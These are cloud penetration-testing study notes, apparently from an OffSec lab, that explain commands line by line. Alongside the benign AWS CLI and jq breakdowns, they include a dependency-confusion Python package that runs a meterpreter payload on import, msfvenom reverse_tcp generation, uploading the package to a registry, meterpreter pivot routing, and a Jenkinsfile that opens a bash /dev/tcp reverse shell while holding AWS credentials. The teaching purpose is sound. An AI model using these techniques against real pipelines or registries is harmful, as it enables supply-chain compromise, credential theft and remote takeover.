# Cloud Enumeration — Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. Line-by-line teardowns for cloud enumeration commands that aren't self-explanatory. For full syntax see [[Cloud Enumeration]] (Command Appendix). For phase-ordered workflow see [[Cloud Methodology]].

#AWS #Cloud #IAM #CommandBreakdowns

---

## `aws ec2 describe-snapshots` with JMESPath size filter

```bash
aws ec2 describe-snapshots \
  --owner-ids 621533607853 \
  --no-cli-pager \
  --query "Snapshots[?VolumeSize==\`1\`]"
```

| Part | What it does |
|------|-------------|
| `aws ec2 describe-snapshots` | List EBS snapshots |
| `--owner-ids 621533607853` | Filter to snapshots owned by this account — without this you'd get all public AWS snapshots (thousands). `--owner-ids` narrows by account ownership |
| `--no-cli-pager` | Print directly to stdout instead of piping through `less` — avoids having to press `q` to exit the pager on large outputs |
| `--query "Snapshots[?VolumeSize==\`1\`]"` | JMESPath client-side filter: `Snapshots` = the array returned, `[?VolumeSize==\`1\`]` = keep only items where `VolumeSize` equals `1` (the backtick syntax is required to compare against a number literal rather than a string) |

**Why the backtick?** JMESPath uses backtick literals for non-string comparisons. `[?VolumeSize=='1']` would compare to the string `"1"` and never match. `[?VolumeSize==\`1\`]` compares to the integer `1`. The backslash escapes the backtick from the shell before JMESPath receives it.

---

## `jq` IAM dump analysis

```bash
jq '.UserDetailList[] | {user: .UserName, groups: .GroupList, attached: [.AttachedManagedPolicies[].PolicyName], inline: [(.UserPolicyList // [])[].PolicyName]}' /tmp/iam-dump.json
```

| Part | What it does |
|------|-------------|
| `.UserDetailList[]` | Select the `UserDetailList` array and iterate over each element |
| `\| {user: ..., groups: ..., attached: ..., inline: ...}` | Construct a new JSON object for each user with renamed/reshaped fields |
| `.UserName` | Extract the username string |
| `.GroupList` | The group list in this dump is already an array of plain strings (not objects) — reference directly |
| `[.AttachedManagedPolicies[].PolicyName]` | Iterate all attached managed policy objects, extract just their `PolicyName` field, wrap in an array |
| `(.UserPolicyList // [])` | `UserPolicyList` may be absent for some users (jq throws an error if you index a null). The `// []` fallback substitutes an empty array when the key is null or missing |
| `[...][].PolicyName` | Iterate the (possibly empty) UserPolicyList array, extract policy names, wrap in output array |

**What this reveals:** most users will show empty `attached` and `inline` arrays, they only inherit permissions via group. A user with a non-empty `attached` or `inline` has **direct** permissions on top of their group inheritance. That's the thing to investigate for misconfigs or privesc paths.

---

## `aws s3 cp` with stdout destination

```bash
aws s3 cp s3://offseclab-emerald-ccchmcgu/proof.txt - 2>/dev/null || echo "not found"
```

| Part | What it does |
|------|-------------|
| `aws s3 cp` | Copy an S3 object — can copy to/from local filesystem or between buckets |
| `s3://offseclab-emerald-ccchmcgu/proof.txt` | Source: the S3 URI identifying bucket and object key |
| `-` | Destination: a single dash tells the AWS CLI to write to stdout instead of a file — useful for reading short text files inline without creating a temp file |
| `2>/dev/null` | Redirect stderr to /dev/null — hides the `AccessDenied` / `NoSuchKey` error messages that appear for buckets where the object doesn't exist or isn't accessible |
| `\|\| echo "not found"` | If the `aws s3 cp` command exits non-zero (access denied, not found, network error), print `not found` — keeps the loop output clean when scanning many buckets |

---

## `curl -H "Host:"` virtual host bypass

```bash
curl -s http://32.198.34.252 -H "Host: www.offseclab.io" | grep -o 'offseclab-[^/"]*'
```

| Part | What it does |
|------|-------------|
| `curl -s` | Silent mode — suppresses progress meter and error messages (clean output) |
| `http://32.198.34.252` | Target the EC2 IP directly — bypasses DNS (useful when you haven't added the lab DNS to `/etc/resolv.conf`) |
| `-H "Host: www.offseclab.io"` | Inject a `Host` header — the EC2 instance hosts multiple virtual sites; without this header, the server doesn't know which site to serve and may return a blank/default page |
| `\| grep -o 'offseclab-[^/"]*'` | `-o` = print only the matching portion (not the whole line); the pattern `offseclab-[^/"]*` matches any string starting with `offseclab-` and ending before a `/` or `"` — extracts bucket names from S3 URLs embedded in the HTML |

**Why this matters:** when the lab DNS IP changes between sessions, you can still access the site by hitting the EC2 IP directly with a `Host` header instead of adding the nameserver to `/etc/resolv.conf`. Useful for quick one-off requests without changing system DNS config.

---

## `aws configure set aws_session_token`

```bash
aws configure set aws_session_token "<long-token-string>" --profile amethyst
```

| Part | What it does |
|------|-------------|
| `aws configure set` | Directly write a single config value to `~/.aws/credentials` without going through the interactive prompts |
| `aws_session_token` | The credential file key name for temporary session tokens (STS-issued credentials always include a token alongside the key ID and secret) |
| `"<long-token-string>"` | The token itself — must be quoted because it contains `+`, `/`, and `=` characters that the shell would otherwise interpret |
| `--profile amethyst` | Write to the `[amethyst]` section of `~/.aws/credentials` |

**When you need this:** `aws configure` interactive mode now prompts for the session token directly (newer CLI versions). But if you're adding a token to an existing profile, or if the interactive flow confused the order, `set` lets you write the value directly without re-entering everything.

---

## Dependency Chain Abuse: Malicious Python Package Anatomy

#DependencyConfusion #CICD #PythonPayload #Meterpreter

```python
# hackshort_util/utils.py — the payload file
import time
import sys

def standardFunction():
        pass

def __getattr__(name):
        pass
        return standardFunction

def catch_exception(exc_type, exc_value, tb):
    while True:
        time.sleep(1000)

sys.excepthook = catch_exception

exec(__import__('zlib').decompress(__import__('base64').b64decode(
    __import__('codecs').getencoder('utf-8')('<base64-meterpreter>')[0])))
```

| Part | What it does |
|------|-------------|
| `def standardFunction()` | A no-op placeholder so `hackshort_util.utils.standardFunction()` succeeds silently if the app tries to call it after import |
| `def __getattr__(name)` | Module-level wildcard: called whenever an attribute is accessed on the module that doesn't exist. Returns `standardFunction` for any call, so `utils.anything()` silently returns `None` without an `AttributeError`. This lets the production app continue loading even though our utils.py doesn't implement the real functions |
| `def catch_exception(exc_type, exc_value, tb)` | A custom top-level exception handler: sleeps forever. Without this, any unhandled exception after import kills the process — and kills our meterpreter session along with it |
| `sys.excepthook = catch_exception` | Replaces Python's default exception handler (which prints the traceback and exits) with our sleeping one. Now the process hangs instead of dying, giving us time to interact with the session |
| `exec(...)` | Evaluates and runs the decoded meterpreter payload string at module import time. This is the moment the reverse shell connects back |
| `__import__('zlib').decompress(...)` | Decompress the msfvenom-generated shellcode. msfvenom with `-f raw -p python/meterpreter/reverse_tcp` outputs a compressed+base64'd+UTF-8-encoded payload exactly in this format |

**Why the `while True: time.sleep(1000)` works:** Python exceptions bubble up the call stack. If the except hook just returns, the interpreter exits. Blocking forever inside the hook keeps the interpreter (and our session) alive. `time.sleep(1000)` also avoids burning 100% CPU.

---

## `msfvenom -f raw -p python/meterpreter/reverse_tcp`

```bash
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=4488
```

| Part | What it does |
|------|-------------|
| `-f raw` | Output format: `raw` for Python means print the payload as a bare Python `exec(...)` expression, not wrapped in any language-specific boilerplate. Contrast with `-f py` which adds a full Python script wrapper — `-f raw` gives just the exec line to paste |
| `-p python/meterpreter/reverse_tcp` | The payload: a pure-Python meterpreter client. No compiled binary, no elf/pe file — the payload IS Python source, so it runs anywhere Python 3 is available (virtually every Linux container) |
| `LHOST` | The IP the production container will try to connect BACK to. Must be your publicly-reachable IP (e.g., cloud Kali's public IP, NOT its 10.x.x.x internal address). The container is in AWS — it calls out to the internet, not to a RFC1918 address |
| `LPORT=4488` | Must match an OPEN inbound port on your listener machine. AWS security groups block ports by default — only the pre-opened ports (e.g., 4488, 22) will receive the connection |

**Common mistake:** running msfvenom on personal Kali and baking in the cloud Kali's internal `10.x.x.x` address as LHOST. The production container can't reach 10.x.x.x from AWS. Always use the cloud Kali's PUBLIC IP for LHOST.

---

## `twine upload --repository-url`

```bash
~/.local/bin/twine upload \
  --repository-url http://pypi.offseclab.io/ \
  -u student -p password \
  dist/hackshort_util-1.1.4.tar.gz
```

| Part | What it does |
|------|-------------|
| `~/.local/bin/twine` | Full path — needed when twine was installed with `pip install --break-system-packages` and isn't on `$PATH` |
| `--repository-url` | Override the upload target from PyPI (the default) to any URL. The private lab PyPI accepts standard twine uploads at this endpoint |
| `-u student -p password` | Credentials for the private registry. These can also go in `~/.pypirc` to avoid typing them — but for one-off lab use, flags are fine |
| `dist/hackshort_util-1.1.4.tar.gz` | **Specific filename, not `dist/*`.** If the directory contains old tarballs from previous sessions (with stale LHOST baked in), `dist/*` uploads them ALL. pip installs the highest version number regardless of upload order. A stale `1.1.6` tarball beats your fresh `1.1.4` |

---

## `route add` in msfconsole (session-based routing)

```
route add 172.30.0.0 255.255.0.0 <session_id>
```

| Part | What it does |
|------|-------------|
| `route add` | Tell MSF's internal routing table to forward packets to this network range through a meterpreter session instead of the local network stack |
| `172.30.0.0 255.255.0.0` | Target network: the /16 subnet the meterpreter session has access to (its eth1 interface). All traffic destined for `172.30.x.x` gets tunnelled through the session |
| `<session_id>` | The MSF session number. When the session dies and a new one opens, the old route goes stale — re-run `route add` with the new session ID. Use `sessions` to see current session numbers |

**When combined with `auxiliary/server/socks_proxy`:** MSF SOCKS listens on `127.0.0.1:1080`. Any tool configured to use that SOCKS proxy (Firefox, proxychains, curl) has its traffic forwarded through the SOCKS listener → MSF route → meterpreter session → container → internal network. The SSH `-L` tunnel from personal Kali makes the cloud Kali's `127.0.0.1:1080` accessible locally.

---

## Jenkinsfile — `withAWS` + `sh` reverse shell

```groovy
withAWS(region: 'us-east-1', credentials: 'aws_key') {
  script {
    if (isUnix()) {
      sh 'bash -c "bash -i >& /dev/tcp/<ip>/4242 0>&1" &'
    }
  }
}
```

| Part | What it does |
|------|-------------|
| `withAWS(credentials: 'aws_key')` | Loads the Jenkins credential named `aws_key` as environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_DEFAULT_REGION`. Any command run inside this block inherits those env vars — including our reverse shell |
| `script { ... }` | Allows Groovy and pipeline DSL features inside a `steps` block. Not strictly needed for `sh`, but enables `if (isUnix())` |
| `if (isUnix())` | Groovy function (not sandboxed) that returns true when the build agent is Unix-based. Prevents the pipeline from crashing on a Windows agent — safe to include always |
| `sh '...'` | Runs a command in the system shell (from the Nodes and Processes plugin, almost always installed). NOT sandboxed like the Groovy `script` block itself |
| `bash -c "..."` | Wraps the payload in a new bash subprocess. Ensures redirections (`>&`, `0>&1`) work regardless of how Jenkins invokes the `sh` step |
| `&` at the end | Sends the `bash -c` command to the background. Without this, the pipeline step would block waiting for the command to exit (which never happens for a reverse shell), and the pipeline would time out |

**Why not write the payload directly in Groovy?** Groovy inside `script {}` runs in a Jenkins sandbox that restricts access to Java runtime APIs and filesystem operations. `sh` bypasses this by delegating to the OS shell, which has no sandbox.

---

## `git show <commit_hash>` — reading diff output for removed secrets

```bash
git show 643827653669...
```

| Part | What it does |
|------|-------------|
| `git show <hash>` | Displays the commit metadata (author, date, message) followed by the unified diff — lines prefixed with `-` were removed, `+` were added |
| Lines starting with `-` | Content that was present BEFORE this commit — these are the deleted lines. A removed hardcoded credential shows here as a `-` line |
| `Authorization: Basic <base64>` | HTTP Basic auth header format. The base64 value is `username:password` encoded with `echo -n "user:pass" \| base64`. Decode with `echo "<value>" \| base64 --decode` |
| `git log` first | Always `git log` before `git show` to identify suspicious commit messages: "Fix issue" / "Remove creds" / "Hotfix" / "Clean up" are red flags worth inspecting |

**Why gitleaks misses this:** gitleaks matches predefined regex patterns for known secret formats (AWS keys starting with `AKIA`, GitHub tokens `ghp_`, etc.). A custom Basic auth header with an org-specific credential doesn't match any pattern. Manual review catches what automated tools miss.
